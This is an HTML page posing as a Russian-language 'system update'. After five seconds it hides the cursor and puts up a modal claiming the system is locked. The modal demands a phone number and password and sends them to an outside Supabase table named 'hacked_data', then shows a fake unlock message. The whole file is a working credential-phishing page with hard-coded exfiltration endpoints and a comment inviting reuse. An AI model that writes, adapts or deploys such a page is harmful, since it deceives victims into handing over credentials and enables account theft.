<!DOCTYPE html>
<html>
<head>
    <title>Системное обновление</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            cursor: none;
        }
        
        #modal {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            z-index: 1000;
            width: 300px;
            text-align: center;
        }
        
        #modal h2 {
            color: red;
            margin-bottom: 20px;
        }
        
        #modal input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        
        #modal button {
            background: #0078d7;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        
        #overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 999;
        }
    </style>
</head>
<body>
    <!-- Оверлей (затемнение фона) -->
    <div id="overlay"></div>
    
    <!-- Модальное окно -->
    <div id="modal">
        <h2>ТРЕБУЕТСЯ ПОДТВЕРЖДЕНИЕ</h2>
        <p>Введите данные для разблокировки системы:</p>
        <input type="tel" id="phone" placeholder="Номер телефона" required>
        <input type="password" id="password" placeholder="Пароль" required>
        <button id="submit">ПОДТВЕРДИТЬ</button>
    </div>

    <!-- Подключаем Supabase JS -->
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <script>
        // Инициализация Supabase (замени на свои данные!)
        const supabaseUrl = 'https://vrzghglpkndfmvpdowqk.supabase.co';
        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZyemdoZ2xwa25kZm12cGRvd3FrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM4ODI1ODksImV4cCI6MjA2OTQ1ODU4OX0.ZbdPGGBoDK84V1okPLvAbdkyxvugg35DWHGPzYqFWQU';
        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
        
        // Показываем модальное окно через 5 секунд
        setTimeout(() => {
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('modal').style.display = 'block';
        }, 5000);
        
        // Обработка отправки формы
        document.getElementById('submit').addEventListener('click', async () => {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            
            if (!phone || !password) {
                alert('Заполните все поля!');
                return;
            }
            
            // Отправляем данные в Supabase
            const { data, error } = await supabase
                .from('hacked_data')
                .insert([{ phone, password }]);
            
            if (error) {
                console.error('Ошибка:', error);
                alert('Ошибка отправки!');
            } else {
                alert('Данные приняты! Система будет разблокирована...');
                document.getElementById('modal').style.display = 'none';
                document.getElementById('overlay').style.display = 'none';
            }
        });
    </script>
</body>
</html>
